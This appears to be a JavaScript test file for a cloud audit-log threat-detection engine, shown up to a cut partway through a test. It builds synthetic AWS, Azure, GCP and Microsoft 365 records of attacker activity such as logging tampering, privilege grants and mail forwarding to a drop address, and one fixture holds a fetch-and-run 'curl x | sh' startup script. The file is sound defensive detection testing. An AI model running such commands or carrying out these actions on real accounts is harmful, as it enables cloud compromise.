// Cloud Audit Log Hunter engine tests (public/js/ops/cloudtrail-engine.js).
// One parser fixture per vendor export in its exact layout, AuditData-in-CSV normalisation,
// every rule on a crafted positive and a silent negative, sliding-window edges, baselines,
// trusted accounts, the malicious-IP and geo joins, skipped-check reporting, determinism
// and the export serialisers.

import { test, assert, group } from "../harness.mjs";
import {
  TOOL_ID, VERSION, COLUMNS, DEFAULTS, RULES, parseInput, analyze, findingsToCsv, iocsToCsv, principalsToCsv, timelineToCsv,
  queriesText, summaryText, exampleDataset, selfTest, detectFile, windows, parseTs, parseAthenaStruct, cleanIp, classifyHeaders, isAfterHours, normalizeM365,
} from "../../public/js/ops/cloudtrail-engine.js";

// ---------------------------------------------------------------------------
// Builders in the vendor record shapes
// ---------------------------------------------------------------------------
const J = (v) => JSON.stringify(v);
const ACCT = "111122223333", FOREIGN = "999988887777", SUB = "00000000-1111-2222-3333-444444444444";
const T = Date.parse("2026-10-07T14:00:00Z"); // a Wednesday, 14:00 UTC (inside working hours)
const at = (s) => new Date(T + s * 1000).toISOString().replace(".000Z", "Z");
let seq = 0;
const rep = (n, fn) => Array.from({ length: n }, (_, k) => fn(k));

const user = (name = "alice", acct = ACCT) => ({ type: "IAMUser", principalId: "AIDA" + name.toUpperCase(), arn: "arn:aws:iam::" + acct + ":user/" + name, accountId: acct, accessKeyId: "AKIAEXAMPLE" + name.toUpperCase(), userName: name });
const ROOT = { type: "Root", principalId: ACCT, arn: "arn:aws:iam::" + ACCT + ":root", accountId: ACCT, accessKeyId: "" };
function ct(name, src, o = {}) {
  return {
    eventVersion: "1.09", userIdentity: o.ident || user(o.user), eventTime: at(o.t || 0), eventSource: src + ".amazonaws.com", eventName: name,
    awsRegion: o.region || "us-east-1", sourceIPAddress: o.ip || "198.51.100.7", userAgent: o.ua || "aws-cli/2.17.20 md/awscrt#0.20.11 ua/2.0 os/linux#6.5.0",
    requestParameters: o.req === undefined ? null : o.req, responseElements: o.res === undefined ? null : o.res,
    ...(o.add ? { additionalEventData: o.add } : {}), ...(o.err ? { errorCode: o.err, errorMessage: "User is not authorized" } : {}),
    requestID: "r" + seq, eventID: "e" + seq++, readOnly: !!o.ro, eventType: o.type || "AwsApiCall", managementEvent: true, recipientAccountId: ACCT, eventCategory: "Management",
  };
}
const login = (ident, ok, mfa, o = {}) => ct("ConsoleLogin", "signin", { ident, type: "AwsConsoleSignIn", res: { ConsoleLogin: ok ? "Success" : "Failure" }, add: { LoginTo: "https://console.aws.amazon.com/console/home", MobileVersion: "No", MFAUsed: mfa ? "Yes" : "No" }, ...o });

function az(op, o = {}) {
  const rid = o.rid || "/subscriptions/" + SUB + "/resourceGroups/rg1/providers/" + op.split("/").slice(0, -1).join("/") + "/x1";
  return {
    authorization: { action: op, scope: rid }, caller: o.caller || "ops@test.darknode.ai", channels: "Operation", claims: o.claims || { idtyp: "user" },
    correlationId: "c" + seq++, eventTimestamp: at(o.t || 0), operationName: { value: op, localizedValue: op }, category: { value: "Administrative", localizedValue: "Administrative" },
    resourceId: rid, status: { value: o.status || "Succeeded", localizedValue: o.status || "Succeeded" }, subscriptionId: SUB,
    properties: o.body ? { requestbody: J(o.body) } : {}, httpRequest: { clientIpAddress: o.ip || "198.51.100.8", method: "PUT" },
  };
}
const azBody = (props) => ({ properties: props });

function gl(method, svc, o = {}) {
  return {
    protoPayload: {
      "@type": "type.googleapis.com/google.cloud.audit.AuditLog", status: o.status || {}, authenticationInfo: { principalEmail: o.who || "dev@test.darknode.ai" },
      requestMetadata: { callerIp: o.ip || "198.51.100.9", callerSuppliedUserAgent: "google-cloud-sdk gcloud/495.0.0" }, serviceName: svc, methodName: method,
      resourceName: o.res || "projects/p1", authorizationInfo: o.authz || [{ resource: "projects/p1", permission: "x.y.z", granted: true }],
      ...(o.req ? { request: o.req } : {}), ...(o.resp ? { response: o.resp } : {}), ...(o.sd ? { serviceData: o.sd } : {}),
    },
    insertId: "i" + seq++, resource: { type: "project", labels: { project_id: "p1" } }, timestamp: at(o.t || 0), severity: "NOTICE",
    logName: "projects/p1/logs/cloudaudit.googleapis.com%2F" + (o.log || "activity"), receiveTimestamp: at((o.t || 0) + 1),
  };
}
const delta = (role, member) => ({ "@type": "type.googleapis.com/google.iam.v1.logging.AuditData", policyDelta: { bindingDeltas: [{ action: "ADD", role, member }] } });
const DENIED = { code: 7, message: "PERMISSION_DENIED" };

function ad(op, o = {}) {
  return {
    CreationTime: at(o.t || 0).slice(0, 19), Id: "id" + seq++, Operation: op, OrganizationId: "org-1", RecordType: o.rt == null ? 1 : o.rt,
    ResultStatus: o.result == null ? "True" : o.result, UserKey: "10032000ABCDEF", UserType: o.ut == null ? 0 : o.ut, Version: 1, Workload: o.wl || "Exchange",
    ClientIP: o.ip || "198.51.100.10", ObjectId: o.obj || "", UserId: o.user || "user@test.darknode.ai",
    ...(o.params ? { Parameters: Object.entries(o.params).map(([Name, Value]) => ({ Name, Value })) } : {}),
    ...(o.mod ? { ModifiedProperties: Object.entries(o.mod).map(([Name, NewValue]) => ({ Name, NewValue, OldValue: "" })) } : {}),
    ...(o.targets ? { Target: o.targets.map((ID) => ({ ID, Type: 1 })) } : {}), ...(o.extra || {}),
  };
}
const AAD = { wl: "AzureActiveDirectory", rt: 8, result: "Success" };

const FILE = {
  aws: (r) => ({ name: "cloudtrail.json", text: J({ Records: r }) }),
  azure: (r) => ({ name: "activity.json", text: J({ value: r }) }),
  gcp: (r) => ({ name: "audit.json", text: J(r) }),
  m365: (r) => ({ name: "ual.json", text: J(r) }),
};
const hunt = (plat, recs, opts = {}) => analyze([FILE[plat](recs)], opts);
const fired = (r, id) => r.findings.filter((f) => f.ruleId === id);
const status = (r, id) => r.tables.rules.find((x) => x.id === id).status;

// ---------------------------------------------------------------------------
// Every rule: crafted positive fires, crafted negative stays silent
// ---------------------------------------------------------------------------
const okSt = (r) => ({ ...r, errorCode: "AccessDenied", errorMessage: "denied" });
const azFail = (r) => ({ ...r, status: { value: "Failed", localizedValue: "Failed" } });
const glDeny = (r) => ({ ...r, protoPayload: { ...r.protoPayload, status: DENIED } });
const adFail = (r) => ({ ...r, ResultStatus: "Failure" });
const sg = (cidr, port) => ({ groupId: "sg-0abc", ipPermissions: { items: [{ ipProtocol: "tcp", fromPort: port, toPort: port, groups: {}, ipRanges: { items: [{ cidrIp: cidr }] }, ipv6Ranges: {}, prefixListIds: {} }] } });
const pol = (principal) => ({ Version: "2012-10-17", Statement: [{ Effect: "Allow", Principal: principal, Action: "sts:AssumeRole" }] });
const OWNER = "/subscriptions/" + SUB + "/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635";
const READER = "/subscriptions/" + SUB + "/providers/Microsoft.Authorization/roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7";
const baseline = (n, o = {}) => rep(n, (k) => ct("DescribeInstances", "ec2", { t: -36000 + k * 300, ro: true, ...o }));

const CASES = {
  "aws-root-console-login": ["aws", [login(ROOT, true, false)], [login(user(), true, true)]],
  "aws-root-api": ["aws", [ct("CreateUser", "iam", { ident: ROOT, req: { userName: "x" } })], [ct("CreateUser", "iam", { req: { userName: "x" } })]],
  "aws-console-login-nomfa": ["aws", [login(user(), true, false)], [login(user(), true, true)]],
  "aws-console-fail-burst": ["aws", rep(10, (k) => login(user("HIDDEN_DUE_TO_SECURITY_REASONS"), false, false, { t: k * 30, ip: "203.0.113.5" })), rep(9, (k) => login(user("HIDDEN_DUE_TO_SECURITY_REASONS"), false, false, { t: k * 30, ip: "203.0.113.5" }))],
  "aws-iam-create-user": ["aws", [ct("CreateUser", "iam", { req: { userName: "x" } })], [okSt(ct("CreateUser", "iam", { req: { userName: "x" } }))]],
  "aws-iam-access-key-other": ["aws", [ct("CreateAccessKey", "iam", { req: { userName: "bob" }, res: { accessKey: { accessKeyId: "AKIAIOSFODNN7EXAMPLE", status: "Active", userName: "bob" } } })], [ct("CreateAccessKey", "iam", { req: { userName: "alice" } })]],
  "aws-iam-login-profile-other": ["aws", [ct("CreateLoginProfile", "iam", { req: { userName: "bob", passwordResetRequired: true } })], [ct("UpdateLoginProfile", "iam", { req: { userName: "alice" } })]],
  "aws-iam-admin-policy": ["aws", [ct("AttachUserPolicy", "iam", { req: { userName: "bob", policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" } })], [ct("AttachUserPolicy", "iam", { req: { userName: "bob", policyArn: "arn:aws:iam::aws:policy/ReadOnlyAccess" } })]],
  "aws-iam-trust-policy": ["aws", [ct("UpdateAssumeRolePolicy", "iam", { req: { roleName: "deploy", policyDocument: J(pol({ AWS: "arn:aws:iam::" + FOREIGN + ":root" })) } })], [okSt(ct("UpdateAssumeRolePolicy", "iam", { req: { roleName: "deploy", policyDocument: J(pol({ AWS: "arn:aws:iam::" + FOREIGN + ":root" })) } }))]],
  "aws-iam-role-external-trust": ["aws", [ct("CreateRole", "iam", { req: { roleName: "vendor", assumeRolePolicyDocument: J(pol({ AWS: FOREIGN })) } })], [ct("CreateRole", "iam", { req: { roleName: "ec2", assumeRolePolicyDocument: J(pol({ Service: "ec2.amazonaws.com" })) } })]],
  "aws-assume-role-untrusted": ["aws", [ct("AssumeRole", "sts", { ident: user("x", FOREIGN), req: { roleArn: "arn:aws:iam::" + ACCT + ":role/vendor", roleSessionName: "s" } })], [ct("AssumeRole", "sts", { req: { roleArn: "arn:aws:iam::" + ACCT + ":role/vendor", roleSessionName: "s" } })]],
  "aws-mfa-removed": ["aws", [ct("DeactivateMFADevice", "iam", { req: { userName: "bob", serialNumber: "arn:aws:iam::" + ACCT + ":mfa/bob" } })], [okSt(ct("DeactivateMFADevice", "iam", { req: { userName: "bob" } }))]],
  "aws-password-policy": ["aws", [ct("DeleteAccountPasswordPolicy", "iam")], [okSt(ct("DeleteAccountPasswordPolicy", "iam"))]],
  "aws-idp-trust": ["aws", [ct("CreateSAMLProvider", "iam", { req: { name: "okta" } })], [okSt(ct("CreateSAMLProvider", "iam", { req: { name: "okta" } }))]],
  "aws-org-detach": ["aws", [ct("LeaveOrganization", "organizations")], [okSt(ct("LeaveOrganization", "organizations"))]],
  "aws-trail-tamper": ["aws", [ct("StopLogging", "cloudtrail", { req: { name: "org-trail" } })], [okSt(ct("StopLogging", "cloudtrail", { req: { name: "org-trail" } }))]],
  "aws-trail-created": ["aws", [ct("CreateTrail", "cloudtrail", { req: { name: "t2", s3BucketName: "logs" } })], [okSt(ct("CreateTrail", "cloudtrail", { req: { name: "t2" } }))]],
  "aws-flowlogs-delete": ["aws", [ct("DeleteFlowLogs", "ec2", { req: { DeleteFlowLogsRequest: { FlowLogId: { content: "fl-1" } } } })], [okSt(ct("DeleteFlowLogs", "ec2"))]],
  "aws-config-disable": ["aws", [ct("StopConfigurationRecorder", "config", { req: { configurationRecorderName: "default" } })], [okSt(ct("StopConfigurationRecorder", "config"))]],
  "aws-guardduty-disable": ["aws", [ct("DeleteDetector", "guardduty", { req: { detectorId: "d1" } })], [ct("UpdateDetector", "guardduty", { req: { detectorId: "d1", enable: true } })]],
  "aws-cloudwatch-tamper": ["aws", [ct("DeleteLogGroup", "logs", { req: { logGroupName: "/aws/lambda/x" } })], [ct("PutRetentionPolicy", "logs", { req: { logGroupName: "/x", retentionInDays: 30 } })]],
  "aws-waf-disable": ["aws", [ct("DeleteWebACL", "wafv2", { req: { name: "edge" } })], [okSt(ct("DeleteWebACL", "wafv2", { req: { name: "edge" } }))]],
  "aws-kms-destroy": ["aws", [ct("ScheduleKeyDeletion", "kms", { req: { keyId: "k1", pendingWindowInDays: 7 } })], [ct("PutKeyPolicy", "kms", { req: { keyId: "k1", policy: J({ Statement: [{ Effect: "Allow", Principal: { AWS: "arn:aws:iam::" + ACCT + ":root" }, Action: "kms:*", Resource: "*" }] }) } })]],
  "aws-ebs-encryption-off": ["aws", [ct("DisableEbsEncryptionByDefault", "ec2")], [okSt(ct("DisableEbsEncryptionByDefault", "ec2"))]],
  "aws-s3-public": ["aws", [ct("PutBucketPolicy", "s3", { req: { bucketName: "b1", bucketPolicy: { Statement: [{ Effect: "Allow", Principal: "*", Action: "s3:GetObject", Resource: "arn:aws:s3:::b1/*" }] } } })], [ct("PutBucketPolicy", "s3", { req: { bucketName: "b1", bucketPolicy: { Statement: [{ Effect: "Allow", Principal: { AWS: "arn:aws:iam::" + ACCT + ":root" }, Action: "s3:GetObject", Resource: "arn:aws:s3:::b1/*" }] } } })]],
  "aws-s3-destroy": ["aws", [ct("PutBucketVersioning", "s3", { req: { bucketName: "b1", VersioningConfiguration: { Status: "Suspended" } } })], [ct("PutBucketVersioning", "s3", { req: { bucketName: "b1", VersioningConfiguration: { Status: "Enabled" } } })]],
  "aws-sg-open-ingress": ["aws", [ct("AuthorizeSecurityGroupIngress", "ec2", { req: sg("0.0.0.0/0", 22) })], [ct("AuthorizeSecurityGroupIngress", "ec2", { req: sg("10.0.0.0/8", 22) })]],
  "aws-secrets-burst": ["aws", rep(20, (k) => ct("GetSecretValue", "secretsmanager", { t: k * 10, ro: true, req: { secretId: "s" + k } })), rep(19, (k) => ct("GetSecretValue", "secretsmanager", { t: k * 10, ro: true, req: { secretId: "s" + k } }))],
  "aws-get-password-data": ["aws", [ct("GetPasswordData", "ec2", { req: { instanceId: "i-1" } })], [okSt(ct("GetPasswordData", "ec2", { req: { instanceId: "i-1" } }))]],
  "aws-ec2-userdata": ["aws", [ct("ModifyInstanceAttribute", "ec2", { req: { instanceId: "i-1", userData: "<sensitiveDataRemoved>" } })], [ct("ModifyInstanceAttribute", "ec2", { req: { instanceId: "i-1", instanceType: { value: "t3.large" } } })]],
  "aws-remote-access": ["aws", [ct("SendCommand", "ssm", { req: { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] } })], [okSt(ct("SendCommand", "ssm", { req: { documentName: "AWS-RunShellScript" } }))]],
  "aws-run-instances-new-region": ["aws", baseline(100).concat([ct("RunInstances", "ec2", { region: "eu-west-1", req: { instanceType: "t3.micro" } })]), baseline(99).concat([ct("RunInstances", "ec2", { region: "eu-west-1", req: { instanceType: "t3.micro" } })])],
  "aws-gpu-instances": ["aws", [ct("RunInstances", "ec2", { req: { instanceType: "p4d.24xlarge" } })], [ct("RunInstances", "ec2", { req: { instanceType: "t3.micro" } })]],
  "aws-snapshot-share": ["aws", [ct("ModifySnapshotAttribute", "ec2", { req: { snapshotId: "snap-1", attributeType: "CREATE_VOLUME_PERMISSION", createVolumePermission: { add: { items: [{ userId: FOREIGN }] } } } })], [ct("ModifySnapshotAttribute", "ec2", { req: { snapshotId: "snap-1", createVolumePermission: { add: { items: [{ userId: ACCT }] } } } })]],
  "aws-rds-public": ["aws", [ct("ModifyDBInstance", "rds", { req: { dBInstanceIdentifier: "db1", publiclyAccessible: true } })], [ct("ModifyDBInstance", "rds", { req: { dBInstanceIdentifier: "db1", publiclyAccessible: false } })]],
  "aws-lambda-unusual-principal": ["aws", baseline(100).concat([ct("UpdateFunctionCode20150331v2", "lambda", { req: { functionName: "pay" } })]), [ct("ListFunctions20150331", "lambda", { t: -40000, ro: true })].concat(baseline(100), [ct("UpdateFunctionCode20150331v2", "lambda", { req: { functionName: "pay" } })])],
  "aws-recon-burst": ["aws", rep(50, (k) => ct("DescribeInstances", "ec2", { t: k * 5, ro: true })), rep(49, (k) => ct("DescribeInstances", "ec2", { t: k * 5, ro: true }))],
  "aws-access-denied-burst": ["aws", rep(25, (k) => okSt(ct("ListUsers", "iam", { t: k * 5 }))), rep(24, (k) => okSt(ct("ListUsers", "iam", { t: k * 5 })))],
  "aws-ua-anomaly": ["aws", [ct("DescribeInstances", "ec2", { ident: ROOT, ro: true })], [ct("DescribeInstances", "ec2", { ro: true })]],

  "az-privileged-role-assignment": ["azure", [az("Microsoft.Authorization/roleAssignments/write", { status: "Started", body: azBody({ roleDefinitionId: OWNER, principalId: "p1", scope: "/subscriptions/" + SUB }) })], [az("Microsoft.Authorization/roleAssignments/write", { status: "Started", body: azBody({ roleDefinitionId: READER, principalId: "p1", scope: "/subscriptions/" + SUB }) })]],
  "az-custom-role-wildcard": ["azure", [az("Microsoft.Authorization/roleDefinitions/write", { body: azBody({ roleName: "god", permissions: [{ actions: ["*"], notActions: [] }] }) })], [az("Microsoft.Authorization/roleDefinitions/write", { body: azBody({ roleName: "vm reader", permissions: [{ actions: ["Microsoft.Compute/*/read"] }] }) })]],
  "az-vm-run-command": ["azure", [az("Microsoft.Compute/virtualMachines/runCommand/action")], [azFail(az("Microsoft.Compute/virtualMachines/runCommand/action"))]],
  "az-keyvault-access-policy": ["azure", [az("Microsoft.KeyVault/vaults/accessPolicies/write", { rid: "/subscriptions/" + SUB + "/resourceGroups/rg1/providers/Microsoft.KeyVault/vaults/kv1/accessPolicies/add" })], [azFail(az("Microsoft.KeyVault/vaults/accessPolicies/write"))]],
  "az-keyvault-secret-burst": ["azure", rep(20, (k) => az("Microsoft.KeyVault/vaults/secrets/getSecret/action", { t: k * 10 })), rep(19, (k) => az("Microsoft.KeyVault/vaults/secrets/getSecret/action", { t: k * 10 }))],
  "az-nsg-open": ["azure", [az("Microsoft.Network/networkSecurityGroups/securityRules/write", { body: azBody({ protocol: "Tcp", destinationPortRange: "22", sourceAddressPrefix: "*", access: "Allow", direction: "Inbound", priority: 100 }) })], [az("Microsoft.Network/networkSecurityGroups/securityRules/write", { body: azBody({ protocol: "Tcp", destinationPortRange: "22", sourceAddressPrefix: "10.0.0.0/8", access: "Allow", direction: "Inbound", priority: 100 }) })]],
  "az-storage-public": ["azure", [az("Microsoft.Storage/storageAccounts/write", { body: { location: "eastus", properties: { allowBlobPublicAccess: true } } })], [az("Microsoft.Storage/storageAccounts/write", { body: { location: "eastus", properties: { allowBlobPublicAccess: false } } })]],
  "az-diagnostics-delete": ["azure", [az("Microsoft.Insights/diagnosticSettings/delete")], [azFail(az("Microsoft.Insights/diagnosticSettings/delete"))]],
  "az-disk-export": ["azure", [az("Microsoft.Compute/disks/beginGetAccess/action")], [azFail(az("Microsoft.Compute/disks/beginGetAccess/action"))]],
  "az-resource-group-delete": ["azure", [az("Microsoft.Resources/subscriptions/resourceGroups/delete", { rid: "/subscriptions/" + SUB + "/resourceGroups/rg-prod" })], [azFail(az("Microsoft.Resources/subscriptions/resourceGroups/delete"))]],
  "az-lock-delete": ["azure", [az("Microsoft.Authorization/locks/delete")], [azFail(az("Microsoft.Authorization/locks/delete"))]],
  "az-guardrail-tamper": ["azure", [az("Microsoft.Security/pricings/write", { body: azBody({ pricingTier: "Free" }) })], [az("Microsoft.Security/pricings/write", { body: azBody({ pricingTier: "Standard" }) })]],
  "az-sql-firewall-open": ["azure", [az("Microsoft.Sql/servers/firewallRules/write", { body: azBody({ startIpAddress: "0.0.0.0", endIpAddress: "255.255.255.255" }) })], [az("Microsoft.Sql/servers/firewallRules/write", { body: azBody({ startIpAddress: "203.0.113.0", endIpAddress: "203.0.113.255" }) })]],
  "az-sp-privileged-write": ["azure", [az("Microsoft.Compute/virtualMachines/runCommand/action", { caller: "5f1c2a3b-0000-4000-8000-000000000001", claims: { idtyp: "app", appid: "5f1c2a3b-0000-4000-8000-000000000001" } })], [az("Microsoft.Compute/virtualMachines/runCommand/action")]],
  "az-failed-burst": ["azure", rep(25, (k) => azFail(az("Microsoft.Compute/virtualMachines/write", { t: k * 5 }))), rep(24, (k) => azFail(az("Microsoft.Compute/virtualMachines/write", { t: k * 5 })))],

  "gcp-iam-privileged-binding": ["gcp", [gl("SetIamPolicy", "cloudresourcemanager.googleapis.com", { sd: delta("roles/owner", "user:x@partner.test.darknode.ai") })], [gl("SetIamPolicy", "cloudresourcemanager.googleapis.com", { sd: delta("roles/viewer", "user:x@partner.test.darknode.ai") })]],
  "gcp-sa-key-created": ["gcp", [gl("google.iam.admin.v1.CreateServiceAccountKey", "iam.googleapis.com", { res: "projects/-/serviceAccounts/123" })], [glDeny(gl("google.iam.admin.v1.CreateServiceAccountKey", "iam.googleapis.com"))]],
  "gcp-impersonation": ["gcp", [gl("GenerateAccessToken", "iamcredentials.googleapis.com", { log: "data_access", res: "projects/-/serviceAccounts/sa@p1.iam.gserviceaccount.com" })], [glDeny(gl("GenerateAccessToken", "iamcredentials.googleapis.com", { log: "data_access" }))]],
  "gcp-log-sink-tamper": ["gcp", [gl("google.logging.v2.ConfigServiceV2.DeleteSink", "logging.googleapis.com", { res: "projects/p1/sinks/siem" })], [glDeny(gl("google.logging.v2.ConfigServiceV2.DeleteSink", "logging.googleapis.com"))]],
  "gcp-firewall-open": ["gcp", [gl("v1.compute.firewalls.insert", "compute.googleapis.com", { req: { name: "ssh", direction: "INGRESS", sourceRanges: ["0.0.0.0/0"], alloweds: [{ IPProtocol: "tcp", ports: ["22"] }] } })], [gl("v1.compute.firewalls.insert", "compute.googleapis.com", { req: { name: "ssh", direction: "INGRESS", sourceRanges: ["10.0.0.0/8"], alloweds: [{ IPProtocol: "tcp", ports: ["22"] }] } })]],
  "gcp-storage-public": ["gcp", [gl("storage.setIamPermissions", "storage.googleapis.com", { res: "projects/_/buckets/b1", sd: delta("roles/storage.objectViewer", "allUsers") })], [gl("storage.setIamPermissions", "storage.googleapis.com", { res: "projects/_/buckets/b1", sd: delta("roles/storage.objectViewer", "user:a@test.darknode.ai") })]],
  "gcp-instance-metadata": ["gcp", [gl("v1.compute.instances.setMetadata", "compute.googleapis.com", { req: { metadata: { items: [{ key: "startup-script", value: "curl x | sh" }] } } })], [gl("v1.compute.instances.setMetadata", "compute.googleapis.com", { req: { metadata: { items: [{ key: "env", value: "prod" }] } } })]],
  "gcp-cloudsql-public": ["gcp", [gl("cloudsql.instances.update", "cloudsql.googleapis.com", { req: { body: { settings: { ipConfiguration: { ipv4Enabled: true, authorizedNetworks: [{ value: "0.0.0.0/0" }] } } } } })], [gl("cloudsql.instances.update", "cloudsql.googleapis.com", { req: { body: { settings: { ipConfiguration: { ipv4Enabled: false, authorizedNetworks: [] } } } } })]],
  "gcp-snapshot-export": ["gcp", [gl("v1.compute.disks.createSnapshot", "compute.googleapis.com"), gl("v1.compute.images.insert", "compute.googleapis.com", { t: 600 })], [gl("v1.compute.images.insert", "compute.googleapis.com", { t: 600 })]],
  "gcp-api-enabled": ["gcp", [gl("google.api.serviceusage.v1.ServiceUsage.EnableService", "serviceusage.googleapis.com", { res: "projects/1/services/compute.googleapis.com" })], [glDeny(gl("google.api.serviceusage.v1.ServiceUsage.EnableService", "serviceusage.googleapis.com"))]],
  "gcp-gpu-instances": ["gcp", [gl("v1.compute.instances.insert", "compute.googleapis.com", { req: { machineType: "zones/us-central1-a/machineTypes/a2-highgpu-1g" } })], [gl("v1.compute.instances.insert", "compute.googleapis.com", { req: { machineType: "zones/us-central1-a/machineTypes/n2-standard-4" } })]],
  "gcp-storage-list-burst": ["gcp", rep(100, (k) => gl("storage.objects.list", "storage.googleapis.com", { t: k, log: "data_access" })), rep(99, (k) => gl("storage.objects.list", "storage.googleapis.com", { t: k, log: "data_access" }))],
  "gcp-actas-by-user": ["gcp", [gl("v1.compute.instances.insert", "compute.googleapis.com", { authz: [{ permission: "compute.instances.create", granted: true }, { permission: "iam.serviceAccounts.actAs", granted: true }] })], [gl("v1.compute.instances.insert", "compute.googleapis.com", { who: "deploy@p1.iam.gserviceaccount.com", authz: [{ permission: "iam.serviceAccounts.actAs", granted: true }] })]],
  "gcp-org-policy": ["gcp", [gl("SetOrgPolicy", "cloudresourcemanager.googleapis.com")], [glDeny(gl("SetOrgPolicy", "cloudresourcemanager.googleapis.com"))]],
  "gcp-denied-burst": ["gcp", rep(25, (k) => glDeny(gl("v1.compute.instances.list", "compute.googleapis.com", { t: k * 5 }))), rep(24, (k) => glDeny(gl("v1.compute.instances.list", "compute.googleapis.com", { t: k * 5 })))],

  "m365-inbox-rule": ["m365", [ad("New-InboxRule", { params: { Name: ".", ForwardTo: "drop@partner.test.darknode.ai" } })], [ad("New-InboxRule", { params: { Name: "Projects", MoveToFolder: "Projects" } })]],
  "m365-mailbox-forwarding": ["m365", [ad("Set-Mailbox", { params: { Identity: "ceo", ForwardingSmtpAddress: "smtp:drop@partner.test.darknode.ai" } })], [ad("Set-Mailbox", { params: { Identity: "ceo", ProhibitSendQuota: "49GB" } })]],
  "m365-transport-rule": ["m365", [ad("New-TransportRule", { params: { Name: "cc", BlindCopyTo: "drop@partner.test.darknode.ai" } })], [ad("New-TransportRule", { params: { Name: "disclaimer", ApplyHtmlDisclaimerText: "x" } })]],
  "m365-mailbox-delegation": ["m365", [ad("Add-MailboxPermission", { params: { Identity: "ceo", User: "assistant", AccessRights: "FullAccess" } })], [ad("Add-MailboxPermission", { result: "False", params: { Identity: "ceo", User: "assistant", AccessRights: "FullAccess" } })]],
  "m365-exchange-role": ["m365", [ad("New-ManagementRoleAssignment", { params: { Role: "ApplicationImpersonation", User: "svc-sync" } })], [ad("New-ManagementRoleAssignment", { params: { Role: "MyBaseOptions", User: "x" } })]],
  "m365-app-consent": ["m365", [ad("Consent to application.", { ...AAD, mod: { "ConsentContext.IsAdminConsent": "False", "ConsentAction.Permissions": "[] => [[ConsentType: Principal, Scope:  Mail.Read offline_access, CreatedDateTime: ]]; " }, targets: ["ServicePrincipal_1", "Mail Sync"] })], [adFail(ad("Consent to application.", { ...AAD }))]],
  "m365-sp-credential": ["m365", [ad("Add service principal credentials.", { ...AAD, targets: ["Payroll App"] })], [adFail(ad("Add service principal credentials.", { ...AAD }))]],
  "m365-role-add": ["m365", [ad("Add member to role.", { ...AAD, obj: "x@test.darknode.ai", mod: { "Role.DisplayName": "Global Administrator" } })], [ad("Add member to role.", { ...AAD, obj: "x@test.darknode.ai", mod: { "Role.DisplayName": "Reports Reader" } })]],
  "m365-ca-policy": ["m365", [ad("Delete conditional access policy", { ...AAD })], [adFail(ad("Delete conditional access policy", { ...AAD }))]],
  "m365-federation": ["m365", [ad("Set federation settings on domain.", { ...AAD, obj: "test.darknode.ai" })], [adFail(ad("Set federation settings on domain.", { ...AAD }))]],
  "m365-audit-disable": ["m365", [ad("Set-AdminAuditLogConfig", { params: { UnifiedAuditLogIngestionEnabled: "False" } })], [ad("Set-AdminAuditLogConfig", { params: { UnifiedAuditLogIngestionEnabled: "True" } })]],
  "m365-mfa-disabled": ["m365", [ad("Disable Strong Authentication.", { ...AAD, obj: "x@test.darknode.ai" })], [adFail(ad("Disable Strong Authentication.", { ...AAD }))]],
  "m365-anonymous-link": ["m365", [ad("AnonymousLinkCreated", { wl: "SharePoint", rt: 14, result: "", extra: { SourceFileName: "payroll.xlsx" } })], [adFail(ad("AnonymousLinkCreated", { wl: "SharePoint", rt: 14 }))]],
  "m365-download-burst": ["m365", rep(100, (k) => ad("FileDownloaded", { wl: "SharePoint", rt: 6, result: "", t: k * 3 })), rep(99, (k) => ad("FileDownloaded", { wl: "SharePoint", rt: 6, result: "", t: k * 3 }))],
  "m365-mail-access-burst": ["m365", rep(50, (k) => ad("MailItemsAccessed", { rt: 50, result: "Succeeded", t: k * 5 })), rep(49, (k) => ad("MailItemsAccessed", { rt: 50, result: "Succeeded", t: k * 5 }))],
  "m365-purge-burst": ["m365", rep(50, (k) => ad("HardDelete", { rt: 3, result: "Succeeded", t: k * 5 })), rep(49, (k) => ad("HardDelete", { rt: 3, result: "Succeeded", t: k * 5 }))],
  "m365-ediscovery-export": ["m365", [ad("New-MailboxExportRequest", { params: { Mailbox: "ceo", FilePath: "\\\\fs\\pst\\ceo.pst" } })], [adFail(ad("New-MailboxExportRequest", { params: { Mailbox: "ceo" } }))]],
  "m365-login-fail-burst": ["m365", rep(10, (k) => ad("UserLoginFailed", { ...AAD, rt: 15, result: "Failed", ip: "203.0.113.9", user: "u" + k + "@test.darknode.ai", t: k * 20 })), rep(9, (k) => ad("UserLoginFailed", { ...AAD, rt: 15, result: "Failed", ip: "203.0.113.9", user: "u" + k + "@test.darknode.ai", t: k * 20 }))],

  "x-malicious-ip": ["aws", [ct("DescribeInstances", "ec2", { ip: "203.0.113.99", ro: true })], [ct("DescribeInstances", "ec2", { ip: "198.51.100.7", ro: true })], { maliciousIps: { updated: "2026-10-16", data: [{ ip: "203.0.113.99", score: 9, source: "ipsum" }] } }],
  "x-impossible-travel": ["aws", [ct("DescribeInstances", "ec2", { ip: "198.51.100.1", ro: true }), ct("DescribeInstances", "ec2", { ip: "203.0.113.1", t: 1800, ro: true })], [ct("DescribeInstances", "ec2", { ip: "198.51.100.1", ro: true }), ct("DescribeInstances", "ec2", { ip: "203.0.113.1", t: 72000, ro: true })], { geo: { "198.51.100.1": { lat: 40.71, lon: -74.0, country: "US" }, "203.0.113.1": { lat: 35.68, lon: 139.69, country: "JP" } } }],
  "x-after-hours-admin": ["aws", [ct("CreateUser", "iam", { t: 9 * 3600, req: { userName: "x" } })], [ct("CreateUser", "iam", { req: { userName: "x" } })]],
  "x-first-seen-service": ["aws", baseline(100).concat([ct("CreateUser", "iam", { req: { userName: "x" } })]), baseline(99).concat([ct("CreateUser", "iam", { req: { userName: "x" } })])],
};

group("cloudtrail: every rule fires on a positive and stays silent on a negative", () => {
  test("every rule has a crafted case and ids are unique (" + RULES.length + " rules)", () => {
    assert.ok(RULES.length >= 60, "rules: " + RULES.length);
    assert.equal(new Set(RULES.map((r) => r.id)).size, RULES.length);
    const missing = RULES.map((r) => r.id).filter((id) => !CASES[id]);
    assert.deepEqual(missing, []);
  });
  for (const r of RULES) {
    const c = CASES[r.id];
    if (!c) continue;
    test(r.id, () => {
      const [plat, pos, neg, opts] = c;
      const p = hunt(plat, pos, opts || {});
      assert.ok(fired(p, r.id).length > 0, r.id + " did not fire; status " + status(p, r.id) + " " + J(p.skipped));
      const n = hunt(plat, neg, opts || {});
